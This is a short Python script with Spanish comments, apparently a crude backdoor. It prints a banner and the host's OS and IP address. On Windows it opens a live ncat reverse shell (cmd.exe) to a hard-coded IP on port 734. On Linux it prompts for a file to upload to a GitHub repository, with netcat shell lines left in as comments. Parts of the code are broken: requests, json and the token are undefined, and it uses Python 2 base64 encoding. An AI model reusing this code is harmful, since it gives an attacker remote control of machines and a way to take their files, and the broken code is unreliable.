import platform
import os
import sysconfig
import socket

def upload_file_to_github(file_path):
    with open(file_path, 'rb') as f:
        file_content = f.read()
    # Codificar la imagen en base64
    file_content = file_content.encode('base64')

    # Construir la URL de la API de GitHub
    url = f"https://api.github.com/repos/Not/contents/{file_path}"
    # Establecer la autorización
    headers = {
        "Authorization": f"Token {token}",
        "Accept": "application/vnd.github+json"
    }
    # Enviar la solicitud para obtener la información del archivo actual
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        # Recuperar la información del archivo actual
        file_info = response.json()
        sha = file_info['sha']
    else:
        sha = None
    # Crear la solicitud para actualizar el archivo
    data = {
        "message": "Uploading file",
        "content": file_content,
        "sha": sha,
    
    }
    response = requests.put(url, headers=headers, data=json.dumps(data))

    # Verificar si la solicitud fue exitosa
    if response.status_code == 200 or response.status_code == 201:
        print(f"File uploaded successfully to Not {file_path}")
    else:
        print(f"Failed to upload file: {response.content}")



def run():
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph='172.16.32.58'
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
        print(' IpAddress: ', IPAddr)
        print('insert Filename to upload: ')
        archive=input()
        upload_file_to_github(archive)
        #os.system( 'nc -lvp 734 -e /bin/sh')
        #os.system('nc' + iph+ ' 734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Windows: ', sysconfig.get_platform()) 
        print('Address ip: ', IPAddr)
        #os.system('ncat -lvp 734 -e cmd.exe')
        os.system('ncat '+ iph +' 734 -e cmd.exe')
    
